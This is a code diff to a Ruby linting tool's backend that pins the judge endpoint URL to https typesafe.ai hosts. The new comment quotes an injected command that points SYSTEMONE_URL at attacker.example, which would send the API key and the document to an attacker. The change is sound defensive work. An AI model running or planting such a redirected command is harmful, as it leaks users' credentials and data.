@@ -27,11 +27,17 @@ module Sloplint
           @key = key
         end
 
-        # The key goes in a header, so the endpoint is https or nothing.
-        # `status` asks the same question without building a backend.
+        HOST = /\A(?:.+\.)?typesafe\.ai\z/
+
+        # The key and the whole document go to this URL, so it is https and
+        # a TypeSafe host or nothing. The host pin is what keeps an injected
+        # `SYSTEMONE_URL=https://attacker.example sloplint check --judge` from
+        # being a valid way to run the sanctioned command. `status` asks the
+        # same question without building a backend.
         def self.https!(url)
           uri = URI(url)
           raise ArgumentError, "SYSTEMONE_URL must be https, got #{uri.scheme.inspect}" unless uri.scheme == "https"
+          raise ArgumentError, "SYSTEMONE_URL must be a typesafe.ai host, got #{uri.host.inspect}" unless uri.host.to_s.match?(HOST)
 
           uri
         end
